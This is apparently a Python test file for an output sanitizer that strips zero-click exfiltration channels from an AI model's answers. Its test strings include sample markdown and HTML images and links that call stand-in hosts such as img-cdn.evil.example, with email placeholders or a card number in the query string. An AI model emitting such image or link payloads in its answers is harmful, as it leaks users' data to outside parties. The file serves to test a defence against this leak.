"""Output sanitizer: zero-click exfiltration through images and links in the model's answer."""

from __future__ import annotations

from aegis.guard.output import OutputSanitizer

ALLOWED = ["docs.acme.example", "cdn.acme.example"]
s = OutputSanitizer()


def test_external_markdown_image_is_removed() -> None:
    r = s.clean("Done! ![status](https://img-cdn.evil.example/p.png?d=[EMAIL_1])", ALLOWED)
    assert "evil.example" not in r.text and "[image removed by policy" in r.text
    assert r.removed[0]["kind"] == "image"


def test_html_image_is_removed() -> None:
    r = s.clean('<img src="https://track.evil.example/x.gif">', ALLOWED)
    assert "<img" not in r.text and "https://track.evil.example" not in r.text


def test_allowlisted_image_without_data_is_kept() -> None:
    text = "![logo](https://cdn.acme.example/logo.png)"
    assert s.clean(text, ALLOWED).text == text


def test_allowlisted_image_with_data_is_removed() -> None:
    r = s.clean("![x](https://cdn.acme.example/p.png?u=[EMAIL_2])", ALLOWED)
    assert "[EMAIL_2]" not in r.text


def test_links_with_data_are_neutralized_plain_links_kept() -> None:
    r = s.clean(
        "[docs](https://docs.python.org/3/) and [click](https://evil.example/?c=4111111111111111)", ALLOWED
    )
    assert "https://docs.python.org/3/" in r.text
    assert "4111" not in r.text and "click [link removed by policy]" in r.text


def test_bare_url_with_placeholder_is_removed() -> None:
    r = s.clean("visit https://evil.example/c?e=[EMAIL_1] now", ALLOWED)
    assert r.text == "visit [url removed by policy] now"
